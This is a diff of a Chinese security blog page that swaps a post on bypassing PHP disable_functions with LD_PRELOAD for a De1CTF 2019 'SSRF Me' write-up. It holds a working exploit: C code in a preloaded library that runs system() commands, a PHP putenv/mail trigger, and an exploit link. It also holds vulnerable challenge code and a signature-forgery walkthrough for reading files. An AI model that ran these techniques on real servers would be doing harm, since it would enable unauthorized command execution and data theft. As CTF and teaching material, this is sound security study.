@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>利用环境变量LD_PRELOAD绕过php disable_function执行系统命令 | 过客</title>	
+<title>[De1CTF 2019]SSRF Me(python代码审计) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">利用环境变量LD_PRELOAD绕过php disable_function执行系统命令</h1>
+			<h1 class="wow swing entry-title">[De1CTF 2019]SSRF Me(python代码审计)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-01-02 14:16:43" itemprop="datePublished" pubdate="">2020-01-02</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-03 21:00:07" itemprop="datePublished" pubdate="">2020-03-03</time></i>
 	          </div>
 			
 </span>
@@ -161,106 +161,160 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
+				<p>进去就有源码~</p>
 <!-- more -->
-<p><strong>利用原理</strong><br>
-php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，利用LD_PRELOAD劫持sendmail程序，再用mail函数来触发就能实现我们的目的<br>
-LD_PRELOAD<br>
-LD_PRELOAD是Linux系统的下一个有趣的环境变量：我们可以利用此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。<br>
-下面用简单的代码。来理解下</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-int main(int argc, char **argv){
-char passwd[] = &quot;password&quot;;
-if (argc &lt; 2) {
-        printf(&quot;usage: %s &lt;password&gt;/n&quot;, argv[0]);
-        return 0;
-}
-if (!strcmp(passwd, argv[1])) {
-        printf(&quot;Correct Password!/n&quot;);
-        return 0;
-}
-printf(&quot;Invalid Password!/n&quot;);
-}
-</code></pre>
-<p>保存上述代码为a.c，并编译为a<br>
-<code>gcc a.c -o a</code><br>
-<img src="https://guokeya.github.io/post-images/1577947706632.png" alt="" loading="lazy"><br>
-以上程序很简单，根据判断传入的字符串是否等于”password”，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-int strcmp(const char *s1, const char *s2){
-    printf(&quot;hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;, s1, s2);
-    return 0;
-}
-</code></pre>
-<p>编译以上代码成为一个动态共享库，让a程序调用我们自定义的strcmp函数<br>
-<code>gcc -fPIC -shared b.c -o b.so</code><br>
-通过LD_PRELOAD来设置它被优先调用<br>
-<code>export LD_PRELOAD=&quot;./b.so&quot;</code><br>
-当我们再次运行a程序。发现无论输入什么都返回密码正确，因为程序调用了我们自定义的strcmp字符串比较函数，我们自定义无论输入什么，都返回0表示正确<br>
-<img src="https://guokeya.github.io/post-images/1577947717795.png" alt="" loading="lazy"><br>
-构造POC<br>
-1.编制我们自己的动态连接程序，让php的mail函数调用/usr/sbin/sendmail。而sendmail又会调用我们自定义的恶意函数(x.so)，就造成了命令执行<br>
-so代码:</p>
-<pre><code>#include&lt;stdlib.h&gt;
-#include &lt;stdio.h&gt;
-#include&lt;string.h&gt;
+<pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
 
-void payload(){
-         FILE*fp = fopen(&quot;/tmp/2.txt&quot;,&quot;w&quot;);#这里是命令执行的地方
-         fclose(fp);
-         system(&quot;mkdir /var/www/html/test&quot;);
- }
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
 
 
-int geteuid(){
-  FILE *fp1=fopen(&quot;/tmp/2.txt&quot;,&quot;r&quot;);
-  if(fp1!=NULL)
-  {
-   fclose(fp1);
-         return 552;
-        }else {
-         payload();
-         return 552;
-       }
-}
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = &quot;Action Error&quot;
+        else:
+            result['code'] = 500
+            result['msg'] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route('/')
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0')
 </code></pre>
-<p>将上述代码保存为a.c<br>
-编译代码如下:<br>
-<code>gcc -c -fPIC a.c -o a</code><br>
-<code>gcc -shared a -o a.so</code><br>
-2.编写php文件，通过putenv来设置LD_PRELOAD，然后执行mail函数触发利用代码<br>
-<code>vim 1.php</code></p>
-<pre><code>&lt;?php
-putenv(&quot;LD_PRELOAD=/var/www/html/a.so&quot;);
-mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;
+<p>python代码一般就是先看路由<br>
+这题有三个路由。<br>
+第一个路由就是显示源码<br>
+第二个路由是数据签名<br>
+暂时只知道它接受一个param参数。然后和密钥+'scan'组合md5<br>
+<img src="https://guokeya.github.io/post-images/1583241217552.png" alt="" loading="lazy"><br>
+三个路由是De1ta。应该是代码关键处<br>
+最后进入Task类中的EXEC函数<br>
+<img src="https://guokeya.github.io/post-images/1583241556947.png" alt="" loading="lazy"><br>
+进行签名验证。<br>
+<img src="https://guokeya.github.io/post-images/1583241800464.png" alt="" loading="lazy"><br>
+总结一下：</p>
+<pre><code>geneSign。输入param可以得到。此时一个参数可控
+md5(密钥+param+action)
+checksign。输入param/action/sign。注意。此时三个参数都可控
+md5(密钥+param+action)==sign
+Task.Exec。action中得包含scan和read。不然你scan读取了flag。怎么看。要么算md5(ip)沙箱名称。。我没成功
+
+从签名的两步中。密钥是不变的。而action定死为scan了
+可变的只有中间的param
+那么md5(密钥+flag.txtread+scan)是否等于md5(密钥+flag.txt+readscan)呢
+答案是肯定的。python直接将他们连接了起来。没有任何操作
 </code></pre>
-<p>3.访问php文件，查看tmp是否存在2.txt<br>
-<img src="https://guokeya.github.io/post-images/1577947732815.png" alt="" loading="lazy"></p>
-<p>exp</p>
-<pre><code>https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
-http://192.168.0.100/bypass_disablefunc.php?cmd=[你要执行的命令]&amp;outpath=/tmp/xx&amp;sopath=[.so的绝对路径]
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577947740535.png" alt="" loading="lazy"></figure>
+<p>答案显而易见。我们可以在geneSign处。将param设为flag.txtread。我们就可以得到md5(密钥+flag.txtread+scan)<br>
+在验证签名时。我们输入sign为之前获取的sign。param为flag.txt 。action为readscan<br>
+那么它验证签名的时候md5(密钥+flag.txt+readscan)是相等的<br>
+<img src="https://guokeya.github.io/post-images/1583243145083.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
 				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
 				 
-				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
-				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/" rel="prev"> CVE-2019-0193:Apache Solr远程命令执行漏洞复现</a></div>
 		 
-		 
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/SxEyR_6MD/" rel="next"> 战队友链</a></div>
+		
 		</div>
 	</nav>
 	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
